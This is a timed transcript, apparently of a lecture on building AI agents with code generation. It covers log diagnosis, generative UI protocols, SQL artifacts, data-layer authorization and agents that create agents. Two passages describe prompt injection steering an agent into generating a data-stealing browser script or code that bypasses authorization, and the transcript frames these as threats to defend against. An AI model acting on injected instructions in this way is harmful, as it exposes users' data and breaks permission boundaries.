They may also be expensive to reproduce because test environments rarely capture the full complexity of production.

675
01:45:53.555 --> 01:45:59.680
Finally, bugs often recur when fixes are not covered by systematic regression tests.

676
01:45:59.836 --> 01:46:04.261
Code generation provides an automated path for diagnosis.

677
01:46:04.211 --> 01:46:19.086
The Agent can read production logs, combine them with architecture documents and PRDs (Product Requirement Documents) to automatically determine whether the execution flow meets expectations, and pinpoint the problematic components and modules.

678
01:46:19.086 --> 01:46:40.986
Based on the analysis results, it generates structured problem reports (priority, module, description, improvement suggestions) and regression test cases—the test cases reference the problem trajectory ID and key interaction rounds, and the test framework automatically replays them to verify that the fixed system produces correct behavior for the same input.

679
01:46:40.986 --> 01:46:51.886
Finally, the Agent connects to GitHub via MCP to create an Issue and assign it to the relevant developer, completing the full automation from problem discovery to task assignment.

680
01:46:51.886 --> 01:46:59.823
Experiment 5-11 advanced difficulty, three stars: : Intelligent Diagnostic System for Production Logs

681
01:46:59.823 --> 01:47:08.061
Experiment Goal: Automatically discover problems from production trajectories, generate test cases, and create work items.

682
01:47:08.061 --> 01:47:18.898
Technical Approach: The Agent analyzes a set of production trajectories alongside system architecture documents and PRDs to identify problem patterns and the modules involved.

683
01:47:18.898 --> 01:47:26.361
It then generates structured problem reports containing the priority, module, description, and recommended improvements.

684
01:47:26.361 --> 01:47:35.923
It also generates regression tests tied to trajectory IDs and interaction rounds; the test framework replays these cases and verifies the results.

685
01:47:35.923 --> 01:47:40.223
Finally, the Agent creates GitHub issues through MCP.

686
01:47:40.223 --> 01:47:46.523
As illustrated in Figure 5-7: Intelligent Production Log Diagnostic Pipeline.

687
01:47:46.523 --> 01:47:48.998
Code as Generative UI.

688
01:47:48.998 --> 01:47:54.298
Traditional Agent systems interact with users mainly through plain-text dialogue.

689
01:47:54.298 --> 01:48:00.123
But text is a linear, one-dimensional medium, and in many scenarios an inefficient one.

690
01:48:00.123 --> 01:48:14.023
Collecting structured information requires a lengthy back-and-forth; complex data relationships are difficult to express in plain text; and when users must choose among options, a text list is far less intuitive than a visual interface.

691
01:48:14.023 --> 01:48:27.998
Code generation offers a way past these limitations: Agents can dynamically generate forms, interactive charts, and even complete web applications, turning static text dialogue into rich, multimodal interaction.

692
01:48:27.998 --> 01:48:34.111
This pattern, where the Agent dynamically generates the interface, is called Generative UI.

693
01:48:34.111 --> 01:48:39.048
A2UI-like Protocols: Standardizing Generative UI.

694
01:48:39.220 --> 01:48:49.882
Allowing Agents to generate HTML and JavaScript that the client renders and executes directly creates a fundamental security risk: the generated code may be malicious.

695
01:48:49.832 --> 01:49:00.970
For example, if someone deliberately hides an instruction in the input, the Agent could be manipulated by prompt injection, unknowingly generating a script that stealthily steals user data.

696
01:49:00.970 --> 01:49:19.382
Here the causal chain matters: prompt injection—malicious instructions mixed into the Agent's input—is the cause, while executing the resulting malicious script in the browser and stealing data resembles traditional Web XSS (Cross-Site Scripting); the attack as a whole should not simply be labeled XSS.

697
01:49:19.382 --> 01:49:26.607
Declarative interface protocols such as A2UI (Agent-to-User Interface) offer a safer approach.

698
01:49:26.607 --> 01:49:38.645
Instead of generating executable code directly, the Agent outputs only a JSON "UI description manifest," such as "Display a table with three rows and two columns titled 'Sales Data.

699
01:49:38.645 --> 01:49:43.995
The client then renders the interface using its own predefined, safe components.

700
01:49:43.995 --> 01:49:56.070
This is like a restaurant menu: the customer (Agent) can order only dishes on the menu (predefined components), not enter the kitchen and prepare arbitrary dishes (execute arbitrary code).

701
01:49:56.070 --> 01:50:02.882
One common point of confusion is AG-UI (Agent-User Interaction, proposed by CopilotKit).

702
01:50:02.882 --> 01:50:19.632
Despite the similar name, it is not a UI description language but an event and transport protocol that streams the Agent's execution state—messages, tool calls, and state patches—to the frontend; it can also carry UI payloads such as A2UI manifests.

703
01:50:19.632 --> 01:50:25.745
The two are complementary and should not be grouped as examples of the same declarative-interface category.

704
01:50:25.745 --> 01:50:43.595
The core design principle of such protocols is security-first: the client maintains a trusted component catalog (e.g., Card, Button, TextField, Table), and if the catalog and renderer are correctly enforced, the Agent may request only cataloged components and cannot inject arbitrary code.

705
01:50:43.595 --> 01:50:51.220
The client renders using its own native components, not by executing arbitrary HTML generated by the Agent.

706
01:50:51.220 --> 01:51:05.132
These protocols typically also support cross-platform rendering (the same description renders in React, Flutter, and native apps) and incremental generation (for example, by streaming JSONL that the client renders as it arrives).

707
01:51:05.132 --> 01:51:21.595
Of course, the declarative approach is suitable for standardized interaction scenarios (forms, tables, cards), while for highly customized needs (e.g., custom visualizations, game interfaces), direct code generation remains the more flexible choice.

708
01:51:21.595 --> 01:51:25.445
Below are specific applications of both patterns.

709
01:51:25.445 --> 01:51:30.320
Delivering Results with HTML: Replacing Markdown Reports.

710
01:51:30.320 --> 01:51:37.182
Generative UI is not only used during interaction but is also changing the form of the Agent's final deliverable.

711
01:51:37.182 --> 01:51:46.257
Traditionally, an Agent finishes a task and hands over a Markdown report; but paging through linearly arranged Markdown is not a pleasant way to read.

712
01:51:46.257 --> 01:51:53.857
As Agents get better at generating frontend code, practice is shifting toward having them produce HTML directly.

713
01:51:53.857 --> 01:51:59.395
Compared to Markdown, HTML deliverables have several distinct advantages.

714
01:51:59.395 --> 01:52:10.157
First, interactive demonstrations let users see how the system works in an interactive form, often making it easier to understand at a glance than through lengthy textual descriptions.

715
01:52:10.157 --> 01:52:20.095
Second, better data visualization lets users explore data through charts and interactive controls for browsing, filtering, and drilling down into details.

716
01:52:20.095 --> 01:52:30.945
Third, continuously improvable deliverables allow the Agent to update and extend an HTML website throughout the task instead of producing a static artifact only at the end.

717
01:52:31.108 --> 01:52:39.945
Take the author's own experience writing research papers as an example: for each research project, the author maintains an interactive website.

718
01:52:39.895 --> 01:52:49.545
It serves as both the final deliverable and a living document throughout the research process—the author has the Agent continuously update it as experiments progress.

719
01:52:49.545 --> 01:52:52.983
This website serves at least three purposes.

720
01:52:52.983 --> 01:53:15.458
First, experiment data traceability: the specific data for every experiment, the prompts used, and the LLM's raw responses can all be inspected item by item on the site; laying everything out in the open makes it easier to spot problems in data construction, format, and distribution, and to notice systematic biases in the LLM's responses or the judge's scoring.

721
01:53:15.458 --> 01:53:26.758
Second, training metric monitoring: the site displays training curves directly, making it easy to monitor the model's internal health metrics and determine whether the training process remains healthy.

722
01:53:26.758 --> 01:53:47.133
The term borrows from medicine: these are internal signals of whether the training process itself is healthy—training and validation loss, gradient norm, learning rate, the model's perplexity when emitting tokens (a measure of its "confidence" in its own output), and in reinforcement learning, reward, KL divergence, and policy entropy.

723
01:53:47.133 --> 01:54:03.970
They differ from final outcome metrics like task accuracy: just as physiological readings in a check-up stand apart from a person's outward performance, internal health metrics often surface problems—non-converging loss, exploding gradients, training collapse—much earlier.

724
01:54:03.970 --> 01:54:14.683
Third, demonstrating system operation: visualizations reveal how the entire system works, allowing readers to grasp the structure of the AI-built system at a glance.

725
01:54:14.683 --> 01:54:17.208
Clarifying User Intent.

726
01:54:17.208 --> 01:54:24.308
When requirements are vague or incomplete, the Agent must ask clarifying questions to gather the missing information.

727
01:54:24.308 --> 01:54:48.683
Products like OpenAI Deep Research typically do this through text-based Q&A, but that approach has clear limits: it is inefficient because each question consumes a dialogue turn, so ten clarification points may require ten rounds; and it is poor at expressing dependencies among questions—for example, a travel destination constrains the available modes of transport—which plain text struggles to present clearly.

728
01:54:48.683 --> 01:55:05.708
Through code generation, the Agent can create structured interactive interfaces to replace text-based Q&A. Figure 5-8 illustrates the dynamic form generation process, showing how the Agent transforms clarification questions into a structured interface that can be filled out in one go.

729
01:55:05.708 --> 01:55:20.570
The Agent generates an HTML form containing various input controls—text boxes for open-ended information, dropdown menus for predefined options, checkboxes for multiple selections, and date pickers for simplified time input.

730
01:55:20.570 --> 01:55:30.758
More advanced versions can use JavaScript to create cascading forms that show or hide follow-up questions and update available options in response to the user's selections.

731
01:55:30.758 --> 01:55:41.670
The user fills out the entire form at once, eliminating multiple dialogue rounds, and can clearly see all required information and the logical relationships between questions.

732
01:55:41.670 --> 01:55:47.220
As illustrated in Figure 5-8: Dynamic Form Generation Process.

733
01:55:47.220 --> 01:55:55.108
Experiment 5-12 intermediate difficulty, two stars: : Intent Clarification System with Dynamic Forms

734
01:55:55.108 --> 01:56:03.245
Experiment Goal: Verify the Agent's ability to clarify user intent by dynamically generating HTML forms.

735
01:56:03.245 --> 01:56:12.645
Technical Approach: The Agent analyzes the user's request, identifies clarification points, and generates form code with cascading logic.

736
01:56:12.645 --> 01:56:19.970
The frontend renders it, the user submits it once, and the Agent parses the JSON data to continue the task.

737
01:56:19.970 --> 01:56:25.233
Acceptance Criteria: User inputs "I want to book a flight to Beijing.

738
01:56:25.233 --> 01:56:39.658
The Agent generates a form with the following fields: departure city (text input), departure date (date picker), trip type (radio buttons for one-way or round-trip), and return date (displayed only when round-trip is selected).

739
01:56:39.658 --> 01:56:43.083
The user submits all information in one go.

740
01:56:43.083 --> 01:56:45.645
Generating SQL Queries.

741
01:56:45.796 --> 01:56:52.558
Database querying is a scenario where code generation can significantly enhance the interaction experience.

742
01:56:52.508 --> 01:57:03.021
Traditional database access relies on GUI tools or handwritten SQL; the former is cumbersome to operate, and the latter requires the user to have specialized knowledge.

743
01:57:03.021 --> 01:57:17.908
An Agent can translate natural language into SQL, but there is a key design choice: should the Agent execute the query and describe the results in natural language, or should it generate the SQL as an artifact for the system to execute and the frontend to display?

744
01:57:17.908 --> 01:57:26.408
The first approach looks more "intelligent" but is grossly inefficient—a query against a large table may return thousands of rows.

745
01:57:26.408 --> 01:57:36.171
Having the LLM read all that and describe it in prose burns tokens and time, and worse, LLMs are notoriously error-prone when "transcribing" data.

746
01:57:36.171 --> 01:57:39.271
A better approach is the Artifact pattern.

747
01:57:39.271 --> 01:57:51.796
Figure 5-9 shows the workflow of an SQL query Agent: rather than reading the data itself, the Agent generates an SQL query and passes it to the system as a standalone executable artifact.

748
01:57:51.796 --> 01:57:57.671
The system executes the query against the database and renders the results in a table for the user.

749
01:57:57.671 --> 01:58:08.371
The data therefore flows directly from the database to the interface without passing through the LLM; the LLM writes the query but never has to read and restate thousands of rows.

750
01:58:08.371 --> 01:58:11.771
This approach is both faster and more accurate.

751
01:58:11.771 --> 01:58:16.983
Generated SQL and visualization code must not be executed directly.

752
01:58:16.983 --> 01:58:28.546
The execution layer should use read-only database credentials, parse the SQL, allow only approved SELECT statements, and reject DDL, DML, and multi-statement queries.

753
01:58:28.546 --> 01:58:38.483
User-provided values should be bound as server-side parameters, with limits on query time, returned rows, accessible tables, and date ranges.

754
01:58:38.483 --> 01:58:46.671
Visualization code should run in a sandbox isolated from the network and filesystem and should produce only an approved result format.

755
01:58:46.671 --> 01:58:53.896
The Artifact pattern shortens the data path; it does not replace authorization checks or execution isolation.

756
01:58:53.896 --> 01:58:59.221
As illustrated in Figure 5-9: SQL Query Agent Workflow.

757
01:58:59.221 --> 01:59:08.583
Going further, the Agent can generate two artifacts that form a pipeline: an SQL query and visualization code, such as code for a bar chart.

758
01:59:08.583 --> 01:59:13.596
The frontend passes the SQL results directly to the visualization code.

759
01:59:13.596 --> 01:59:21.596
The LLM generates the code but does not participate in the data path—this is the essence of code generation as an interface.

760
01:59:21.596 --> 01:59:29.408
Experiment 5-13 intermediate difficulty, two stars: : Natural Language Interaction ERP Agent

761
01:59:29.408 --> 01:59:40.721
ERP (Enterprise Resource Planning) software is a critical system for businesses, typically using a GUI interface where complex operations require multiple mouse clicks.

762
01:59:40.721 --> 01:59:48.858
An AI Agent can translate users' natural-language requests into SQL queries, enabling automated database access.

763
01:59:48.858 --> 02:00:10.258
Requirements: Set up a PostgreSQL database containing two tables: (1) Employee table, including employee ID, name, department, level, hire date, resignation date (NULL means currently employed); (2) Salary table, including employee ID, pay date, salary (one record per month).

764
02:00:10.258 --> 02:00:13.058
The Agent automatically answers:

765
02:00:13.058 --> 02:00:15.796
What is the average employee tenure?

766
02:00:15.796 --> 02:00:19.133
How many active employees are in each department?

767
02:00:19.133 --> 02:00:22.746
Which department has the highest average employee level?

768
02:00:22.746 --> 02:00:26.983
How many new employees joined each department this year and last year?

769
02:00:26.983 --> 02:00:32.708
What was the average salary for department A from March of the year before last to May of last year?

770
02:00:32.708 --> 02:00:37.483
Which department had a higher average salary last year, A or B?

771
02:00:37.483 --> 02:00:41.683
What is the average salary for employees at each level this year?

772
02:00:41.683 --> 02:00:49.808
What is the average salary in the last month for employees with tenure of less than one year, one to two years, and two to three years?

773
02:00:49.808 --> 02:00:54.771
Which 10 employees had the largest salary increase from last year to this year?

774
02:00:54.771 --> 02:01:02.408
Are there any cases of unpaid wages (employees who were employed during a given month but have no salary record for that month)?

775
02:01:02.408 --> 02:01:05.258
Dynamically Generating Software.

776
02:01:05.428 --> 02:01:12.790
The ultimate application of code generation is letting the Agent create software entirely dynamically, from scratch.

777
02:01:12.740 --> 02:01:29.865
Anthropic's "Imagine with Claude" marks out the frontier: the user makes a request, Claude generates the frontend interface and interaction logic in real time, the user interacts with the generated software, and Claude modifies the code to produce a new interface showing the results.

778
02:01:29.865 --> 02:01:34.703
The user watches an application come into being from nothing and keep evolving.

779
02:01:34.852 --> 02:01:43.527
Fully dynamic generation, however, is costly and slow—better suited to demonstrations of what is possible than to production use.

780
02:01:43.477 --> 02:01:47.952
A more pragmatic approach is to customize an existing framework.

781
02:01:47.952 --> 02:01:55.477
This "semi-custom" model preserves the stability of the base software while exposing selected aspects to user control.

782
02:01:55.477 --> 02:02:15.589
The user can say "make the button blue," "add a shortcut menu to the sidebar," or "switch to a more readable font"; the Agent updates the frontend code, and HMR (Hot Module Replacement—which updates affected modules without a full-page reload and usually preserves application state) applies the changes immediately.

783
02:02:15.589 --> 02:02:20.402
A one-size-fits-all product becomes an experience tailored to each user.

784
02:02:20.402 --> 02:02:28.164
Experiment 5-14 intermediate difficulty, two stars: : Conversational Interface Customization System

785
02:02:28.164 --> 02:02:41.489
Experiment Goal: Enable users to customize the software interface instantly through natural-language dialogue, and evaluate whether code generation with hot reload can effectively provide personalized user experiences.

786
02:02:41.489 --> 02:02:55.127
Technical Approach: Build a basic chatbot application (React frontend and FastAPI backend), and run both components in development mode with hot reload enabled (React HMR and FastAPI reload).

787
02:02:55.127 --> 02:03:04.727
Users propose UI customization requirements (colors, fonts, layout, component positions, etc.) during the conversation.

788
02:03:04.727 --> 02:03:08.127
The Agent autonomously modifies the code.

789
02:03:08.127 --> 02:03:17.989
The hot-reload mechanism automatically detects file changes, the frontend recompiles and refreshes, and the user sees the interface changes in real time.

790
02:03:17.989 --> 02:03:22.289
The system supports multiple rounds of iterative customization.

791
02:03:22.289 --> 02:03:27.664
Dynamic software changes the traditional security premise along with its flexibility.

792
02:03:27.664 --> 02:03:37.064
In the past, application business code was developed, reviewed, tested, and deployed, then remained relatively stable for a period of time.

793
02:03:37.064 --> 02:03:48.727
Authorization checks therefore usually lived in the application layer: business code first decided whether the current user could read or modify a record, and only then sent the operation to the database.

794
02:03:48.727 --> 02:03:58.314
When interfaces, workflows, and even data-access code can be generated or rewritten by an Agent at any time, that layer is no longer stable.

795
02:03:58.314 --> 02:04:08.264
Newly generated code may omit a subtle authorization check, expose a field that was previously hidden, or bypass an existing check through another call path.

796
02:04:08.264 --> 02:04:20.252
Whether the cause is an ordinary generation error or dangerous code produced after prompt injection, the result is the same: the permission boundary that business code was supposed to maintain may be silently broken.

797
02:04:20.252 --> 02:04:28.027
The security goal for dynamic software therefore cannot be to “make sure the AI writes every authorization check correctly.

798
02:04:28.027 --> 02:04:34.589
It should be that permission constraints remain impossible to bypass even when the AI writes incorrect code.

799
02:04:34.589 --> 02:04:43.527
If authorization checks live inside the dynamically generated business logic, they share the same trust domain as the code they are meant to constrain.

800
02:04:43.527 --> 02:04:55.164
Prompts, tests, and code review reduce the error rate, but they cannot exhaustively cover every execution path introduced by future generations and cannot serve as the final security boundary.

801
02:04:55.164 --> 02:05:00.164
A more robust architecture moves the trust boundary down to the data layer.

802
02:05:00.164 --> 02:05:12.727
Dynamically generated application code can handle presentation, workflows, and business orchestration, while a stable, human-reviewed mechanism enforces the rules that decide who may do what to which data.

803
02:05:12.727 --> 02:05:26.839
Database row-level security can restrict users to records in their own tenant; constraints and validators can reject illegal states; controlled views, stored procedures, or data-access services can expose only approved operations.

804
02:05:26.839 --> 02:05:36.027
Every read and write should also carry an access context bound by a trusted runtime, containing the user, tenant, role, or Agent identity.

805
02:05:36.027 --> 02:05:45.014
Generated code receives only this scoped identity: it cannot forge the identity or obtain a privileged database credential that bypasses the rules.

806
02:05:45.014 --> 02:05:51.727
Even if it omits its own authorization check, the data layer still rejects the unauthorized operation.

807
02:05:51.892 --> 02:05:57.342
Moving authorization downward does not mean putting all business logic in the database.

808
02:05:57.292 --> 02:06:05.429
The application layer may still perform pre-checks to provide fast feedback, but the data layer must retain final decision authority.

809
02:06:05.429 --> 02:06:10.517
The same rule can improve the experience above and provide a guarantee below.

810
02:06:10.517 --> 02:06:19.829
That guarantee also requires every data-access path to pass through the trusted data layer; generated code must not be able to connect directly around it.

811
02:06:19.829 --> 02:06:29.079
The result is an application whose upper layer can keep changing while its non-negotiable permission constraints remain in a layer that is not rewritten on every generation.

812
02:06:29.079 --> 02:06:35.879
This is the data layer of Chapter 1's three-layer guardrail framework—the one that is hardest to bypass.

813
02:06:35.879 --> 02:06:43.892
Experiment 5-15 advanced difficulty, three stars: : Permission-Embedded Data Objects for Dynamic Software

814
02:06:43.892 --> 02:06:54.604
Experiment Goal: Build an object store that allows application code to be generated or rewritten dynamically while still enforcing authorization and data integrity at the data layer.

815
02:06:54.604 --> 02:07:04.529
Verify that generated code cannot cross the stable data boundary by skipping a state-machine transition, writing an out-of-range value, or reading across tenants.

816
02:07:04.529 --> 02:07:10.529
Technical Approach: Provide a Python object-store middleware layer over PostgreSQL.

817
02:07:10.529 --> 02:07:26.942
Data types declare their permission rules, access context, validators, object relationships, and reactions; every object read or write passes in turn through the permission and validation pipeline, persistence, referential-integrity checks, and so on.

818
02:07:26.942 --> 02:07:40.079
Acceptance Criteria: A valid hiring-pipeline update succeeds; skipping a candidate state transition, writing a salary outside the position range, and reading across tenants are all rejected by the data layer.

819
02:07:40.079 --> 02:07:43.517
Code Creating Code: Agent Bootstrapping.

820
02:07:43.517 --> 02:07:52.892
The previous sections have followed code generation across one domain after another—from mathematical reasoning to document creation to interface customization.

821
02:07:52.892 --> 02:08:00.792
Push these capabilities to their limit and a natural question arises: can an Agent use code generation to create another Agent?

822
02:08:00.792 --> 02:08:05.629
As illustrated in Figure 5-10: Agent Bootstrapping Loop.

823
02:08:05.629 --> 02:08:08.992
Agent Self-Repair: OpenClaw Doctor.

824
02:08:08.992 --> 02:08:14.117
A crucial prerequisite for Agent bootstrapping is the ability to self-repair.

825
02:08:14.117 --> 02:08:21.104
The doctor command in OpenClaw embodies this capability—it can automatically detect three types of issues:

826
02:08:21.104 --> 02:08:28.654
Configuration anomalies: Expired OAuth tokens, legacy configuration formats, port conflicts

827
02:08:28.654 --> 02:08:34.167
State issues: Stale session lock files, missing plugin dependencies

828
02:08:34.167 --> 02:08:39.392
Service health issues: Gateway not running, missing sandbox images

829
02:08:39.392 --> 02:08:56.392
It then automatically resolves them through a layered repair strategy: safe fixes (configuration normalization, lock file cleanup) are executed automatically; risky operations (service restarts, forced configuration overwrites) require user confirmation.

830
02:08:56.392 --> 02:09:12.454
Let's not overstate this: high-frequency problems such as expired tokens, stale lock files, and port conflicts have clear detection rules and fixed repair actions, and doctor addresses them first with deterministic checks, much like a traditional operations script.

831
02:09:12.454 --> 02:09:27.379
Agent capability becomes meaningful in the second layer: for harder problems beyond those rules, doctor uses an LLM to analyze error logs, interpret configuration files, infer root causes, and produce a targeted repair plan.

832
02:09:27.379 --> 02:09:40.104
Deterministic checks resolve common problems reliably, while the LLM covers the long tail; together, the two layers allow doctor --fix to resolve a substantial share of common gateway issues automatically.

833
02:09:40.104 --> 02:09:52.704
What makes this an "Agent repairing Agent" pattern is that the Agent works not on an external system but on its own runtime environment, elevating self-repair from a system-adapter function to core bootstrapping infrastructure.

834
02:09:52.704 --> 02:09:56.154
Key Techniques for Making an Agent Write an Agent.

835
02:09:56.308 --> 02:10:08.208
Creating a high-quality Agent is far harder than generating ordinary application code, because it demands a deep understanding of Agent architecture patterns, best practices, and common pitfalls.

836
02:10:08.158 --> 02:10:16.383
Without that domain expertise, even the most powerful code generation models may produce Agents with serious architectural flaws.

837
02:10:16.383 --> 02:10:18.720
Common flaws include:

838
02:10:18.720 --> 02:10:35.420
Ad hoc context management: Failing to use the standard context format discussed in Chapter 2, stuffing trajectories as plain text into the context, ignoring KV Cache optimizations from structured messages, and introducing boundary-condition bugs in tool-call loops

839
02:10:35.420 --> 02:10:44.920
Non-standard tool design: Vague descriptions, missing usage boundary instructions and negative lists, and parameters lacking concrete examples

840
02:10:44.920 --> 02:10:52.545
Outdated technology choices: A tendency to use the most common but outdated models and APIs from training data.

841
02:10:52.545 --> 02:10:58.433
Solution: Maintain a SOTA knowledge base or equip the Agent with search capabilities

842
02:10:58.433 --> 02:11:06.620
Disconnection from the external ecosystem: Using deprecated APIs, unmaintained libraries, or flawed patterns

843
02:11:06.620 --> 02:11:21.183
The most effective path to solving these problems is not to exhaustively list all rules in the prompt, but to provide high-quality Agent implementations as reference examples, guiding the code generation Agent to modify them rather than starting from scratch.

844
02:11:21.183 --> 02:11:27.983
The advantage of example-based generation is plain: the example code itself carries the best practices.

845
02:11:27.983 --> 02:11:40.933
An Agent that adapts a validated implementation gets things right more often than one that starts from scratch, because the implementation preserves sound architectural choices without requiring every rule to be spelled out in the prompt.

846
02:11:40.933 --> 02:12:01.458
When an Agent receives a task to develop a new Agent, it should first copy its own code (or other validated, high-quality implementations) and then make targeted modifications: adjust the system prompt to match the new role, replace or add tools to suit new functions, modify business logic while preserving the architectural framework.

847
02:12:01.458 --> 02:12:14.958
This "self-replication with adaptive modification" pattern ensures the new Agent inherits core technical advantages while allowing differentiation in specific dimensions—much like gene replication with mutation in biology.

848
02:12:14.958 --> 02:12:22.095
Experiment 5-16 advanced difficulty, three stars: : Develop an Agent That Can Create Agents

849
02:12:22.095 --> 02:12:37.033
Experiment Goal: Build a Coding Agent with metaprogramming capabilities—the ability to write programs that generate or modify other programs—so that it can automatically create new Agent systems from user requirements while adhering to best practices.

850
02:12:37.033 --> 02:12:47.620
Technical Approach: Provide the Coding Agent with high-quality Agent implementations as reference examples (the ch5/coding-agent project itself can be used).

851
02:12:47.620 --> 02:12:56.820
When tasked with creating a new Agent, the Agent first copies this example code and then makes targeted modifications based on the user's specific needs.

852
02:12:56.820 --> 02:13:03.120
Acceptance Criteria: The generated Agent runs successfully and completes basic tasks.

853
02:13:03.120 --> 02:13:14.933
Verify that it uses standard message formats and tool-call protocols, currently recommended models and APIs, and correct context and state management across multiple conversation turns.

854
02:13:14.933 --> 02:13:22.545
Compare generation from scratch with example-based modification, and confirm that the latter improves quality and efficiency.

855
02:13:22.545 --> 02:13:28.433
As illustrated in Figure 5-11: Pipeline of an Agent That Can Create Agents.

856
02:13:28.433 --> 02:13:30.320
Chapter Summary.

857
02:13:30.320 --> 02:13:40.408
This chapter has argued one thing throughout: code is not merely a tool for writing programs—it is the language of an Agent's formalized thinking and precise expression.

858
02:13:40.564 --> 02:13:58.801
The Harness engineering section reached one central conclusion: Coding Agents are mature not because code generation models are exceptionally strong, but because decades of accumulated software engineering infrastructure—test suites, type systems, version control—naturally form a powerful Harness.

859
02:13:58.751 --> 02:14:03.114
That conclusion deserves to travel to other Agent scenarios.

860
02:14:03.114 --> 02:14:18.839
The section on failure and error recovery offers the flip side of the same theme: an Agent's reliability is determined not by whether the model makes mistakes, but by whether every class of failure has a corresponding detection, recovery, handover, and termination path.

861
02:14:18.839 --> 02:14:27.151
The second part demonstrated the broad value of code generation beyond programming, corresponding to the six dimensions in the main text:

862
02:14:27.151 --> 02:14:35.064
Thinking Tool: Leveraging symbolic computation and constraint solving to compensate for the shortcomings of probabilistic thinking

863
02:14:35.064 --> 02:14:47.876
Business Rule Constraints: Expressing business rules unambiguously and providing a deterministic safety backstop for irreversible operations, where the value of the guarantee far exceeds its implementation cost

864
02:14:47.876 --> 02:15:02.326
Multimedia Generation: Creating multimodal content like PPTs and videos through a Proposer-Reviewer mechanism; the choice between code generation and generative models depends on the artifact's intrinsic complexity and precision requirements

865
02:15:02.326 --> 02:15:10.664
System Adapter: Automatically following format evolution to achieve full automation of log parsing and problem diagnosis

866
02:15:10.664 --> 02:15:21.289
Generative UI: Dynamically creating forms, visualizations, and even complete customizable applications, breaking free from plain text limitations

867
02:15:21.289 --> 02:15:30.139
Agent Bootstrapping: Using code to repair existing Agents and create new ones, ultimately enabling an Agent to create other Agents

868
02:15:30.139 --> 02:15:42.751
The value of code to an Agent comes down to this: it is at once a means of getting tasks done and a mechanism for accumulating knowledge, creating tools, and improving itself—a true "meta-capability.

869
02:15:42.751 --> 02:15:55.339
At this point, we have combined context, knowledge, tools, and coding capabilities into the foundational architecture of a general-purpose Agent, with code generation as its most general meta-capability.

870
02:15:55.339 --> 02:16:00.751
Yet the first five chapters still assume that the Agent and the world take turns acting.

871
02:16:00.751 --> 02:16:16.939
Chapter 6 fills in the final piece of “Building Agents” by extending the observation and action spaces to asynchronous events, voice, screens, and the physical world; once that piece is in place, Chapter 7 turns to evaluation and continual improvement.

872
02:16:16.939 --> 02:16:18.876
Thought Questions.

873
02:16:19.036 --> 02:16:25.648
intermediate difficulty, two stars:  Code generation is called an Agent's “meta-capability.

874
02:16:25.598 --> 02:16:34.986
But code execution introduces security risks—Agent-generated code may contain vulnerabilities, enter infinite loops, or exhaust resources.

875
02:16:34.986 --> 02:16:44.261
Sandboxing can mitigate some of these risks, but it also limits what the code can do, for example by denying access to the network or file system.

876
02:16:44.261 --> 02:16:48.873
How can the optimal balance between security and capability be found?

877
02:16:48.873 --> 02:16:58.436
advanced difficulty, three stars:  Agent bootstrapping—an Agent that can create Agents—enables the “self-reproduction of intelligence.

878
02:16:58.436 --> 02:17:03.448
But every bootstrapping iteration may introduce new biases or errors.

879
02:17:03.448 --> 02:17:07.011
Will these errors accumulate across generations?

880
02:17:07.011 --> 02:17:10.786
How can degradation in Agent bootstrapping be prevented?

881
02:17:10.786 --> 02:17:19.961
intermediate difficulty, two stars:  When a code-generation Agent handles log parsing, it can automatically follow format evolution.

882
02:17:19.961 --> 02:17:27.736
But if a format change is a bug rather than an intended modification, the Agent's adaptability may instead conceal the problem.

883
02:17:27.736 --> 02:17:35.111
How should the Agent distinguish between “a change that requires adaptation” and “an anomaly that requires reporting”?

884
02:17:35.111 --> 02:17:46.023
intermediate difficulty, two stars:  This chapter repeatedly uses the proposer-reviewer mechanism in PPT generation, video editing, and log visualization.

885
02:17:46.023 --> 02:17:59.473
If the Reviewer's aesthetic preferences differ from those of the target user—for example, if the Reviewer considers the information density reasonable but the user finds it too crowded—the feedback loop may converge on the wrong local optimum.

886
02:17:59.473 --> 02:18:03.911
How can user-preference feedback be incorporated into the Reviewer loop?

887
02:18:03.911 --> 02:18:23.873
intermediate difficulty, two stars:  This chapter demonstrates several ways for a Coding Agent to consolidate experience gained through execution and debugging back into the codebase—writing knowledge-base files, updating architecture documentation, maintaining project instruction files, and encoding operational sequences as code.

888
02:18:23.873 --> 02:18:31.348
If this experience is further distilled into rules in the system prompt, the rule set will continue to expand over time.

889
02:18:31.348 --> 02:18:39.011
How can “garbage collection” be performed on the accumulated rules to identify and remove redundant or outdated entries?

890
02:18:39.011 --> 02:18:45.561
Why is a single successful code modification not yet continuous evolution in the sense of Chapter 9?

891
02:18:45.561 --> 02:18:53.448
introductory difficulty, one star:  “Teams that are friendly to remote work are often also friendly to AI Agents.

892
02:18:53.448 --> 02:18:59.873
How close is your team or organization to being “AI-ready” in terms of knowledge documentation?

893
02:18:59.873 --> 02:19:02.311
What is the greatest obstacle?

894
02:19:02.311 --> 02:19:15.173
advanced difficulty, three stars:  Simon Willison proposed the “Lethal Triad” for Agents—access to private data, exposure to untrusted content, and external communication capability.

895
02:19:15.173 --> 02:19:19.223
This chapter adds a fourth element: persistent memory.

896
02:19:19.223 --> 02:19:25.761
How would you design a security strategy for a production environment that must handle all four simultaneously?

897
02:19:25.761 --> 02:19:39.586
intermediate difficulty, two stars:  The Artifact pattern allows an Agent to generate SQL or frontend code for execution by the database and browser, bypassing the need for the LLM to process large volumes of data.

898
02:19:39.586 --> 02:19:51.398
What are the advantages and disadvantages of this division of labor—“the Agent generates code, the system executes code”—compared with the traditional pattern in which the Agent directly provides the answer?

899
02:19:51.398 --> 02:19:59.636
Moreover, generated SQL may perform destructive operations, and generated HTML may contain vulnerabilities.

900
02:19:59.636 --> 02:20:02.698
How can the system's security be ensured?

901
02:20:02.698 --> 02:20:19.386
intermediate difficulty, two stars:  Encoding business rules as checks inside tools against authoritative database records, while using parameter design to guide the model to check policy conditions before making a call, essentially uses code structure to constrain Agent behavior.

902
02:20:19.386 --> 02:20:26.686
What are the advantages and limitations of this “code as rules” pattern compared with rules expressed in natural language?

